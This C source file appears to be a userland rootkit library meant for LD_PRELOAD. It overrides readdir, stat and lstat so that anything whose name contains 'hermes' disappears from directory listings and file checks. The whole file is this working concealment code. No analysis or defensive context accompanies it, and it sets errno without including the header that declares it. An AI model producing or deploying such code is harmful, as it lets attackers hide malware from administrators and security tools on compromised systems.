#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char* hidden_name = "hermes";

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, hidden_name) == NULL) {
            return dir;
        }
    }
    return NULL;
}

int stat(const char *path, struct stat *buf) {
    int (*original_stat)(const char*, struct stat*) = dlsym(RTLD_NEXT, "stat");
    if (strstr(path, hidden_name) != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    int (*original_lstat)(const char*, struct stat*) = dlsym(RTLD_NEXT, "lstat");
    if (strstr(path, hidden_name) != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_lstat(path, buf);
}
